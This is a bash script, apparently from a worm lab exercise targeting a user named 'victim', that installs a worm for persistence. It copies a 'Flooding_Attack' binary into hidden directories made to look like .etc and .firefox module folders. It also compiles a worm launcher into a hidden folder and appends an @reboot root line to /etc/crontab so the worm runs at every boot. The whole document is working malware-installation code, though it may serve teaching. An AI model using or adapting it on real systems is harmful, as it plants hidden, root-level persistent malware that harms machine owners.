#!/bin/bash

# This script is to:
# (1) Put the worm binary at the two locations:
#      * /home/victim/.etc/.module/Flooding_Attack
#      * /home/victim/.firefox/.module/Flooding_Attack
# (2) Put the worm checker program at "/home/victim/.Launch_Attack/Launching_Attack"
# (3) Tamper the crontab so that the worm is executed whenever the computer is booted
# 
# Noted that this script does not do any payload.

ldir="/home/victim/.Launch_Attack"
lfname="Launching_Attack"

tamper_crontab() {
    crtbpath="/etc/crontab"

    if  grep -q "$ldir/$lfname" $crtbpath; then
        echo "Crontab already tampered."
        return 0
    fi

    if  echo "@reboot root cd $ldir && [ -f $ldir/$lfname ] && ./$lfname" >> $crtbpath; then
        echo "Corntab tampered."
        return 0
    else
        echo "Failed to tamper crontab."
        return 1
    fi
}

distribute_worm() {
    wormbin="Flooding_Attack"
    dir1="/home/victim/.etc/.module"
    dir2="/home/victim/.firefox/.module"

    if  mkdir -p $dir1 2> /dev/null &&\
        mkdir -p $dir2 2> /dev/null &&\
        cp "./$wormbin" "$dir1/$wormbin" 2> /dev/null &&\
        cp "./$wormbin" "$dir2/$wormbin" 2> /dev/null; then

        echo "Worm distributed."
        return 0
    else
        echo "Failed to distribute the worm."
        return 1
    fi
}

distribute_worm_launcher(){
    mkdir -p "$ldir" 2> /dev/null
    if  g++ -o "$ldir/$lfname" worm_launcher.cpp 2> /dev/null; then
        echo "Worm launcher distributed."
        return 0
    else
        echo "Failed to distribute worm launcher"
        return 1
    fi
}

if distribute_worm_launcher && distribute_worm && tamper_crontab ; then
#if tamper_crontab ; then
    echo "All tasks successed."
else
    echo "Task failed."
fi